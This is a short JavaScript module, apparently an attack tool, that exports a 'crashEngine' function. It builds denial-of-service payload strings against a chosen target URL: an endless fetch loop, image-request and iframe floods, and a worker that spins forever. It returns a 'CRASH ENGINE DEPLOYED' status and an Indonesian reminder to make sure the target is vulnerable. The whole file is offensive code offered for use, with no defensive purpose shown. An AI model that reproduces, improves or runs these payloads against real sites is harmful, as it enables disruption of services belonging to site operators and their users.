function crashEngine(target, intensity) {
  const payloads = [
    `while(true){fetch('${target}').catch(()=>{})}`,
    `setInterval(()=>{for(let i=0;i<999;i++){new Image().src='${target}?v='+Math.random()}},1)`,
    `(()=>{const w=new Worker(URL.createObjectURL(new Blob(['while(true){}'])));})()`,
    `for(let i=0;i<999999;i++){document.createElement('iframe').src='${target}'}`
  ];
  
  return {
    status: '💀 CRASH ENGINE DEPLOYED',
    target: target,
    intensity: intensity,
    payload: payloads.join('\n'),
    note: 'PASTIKAN TARGET VULN!'
  };
}

module.exports = { crashEngine };
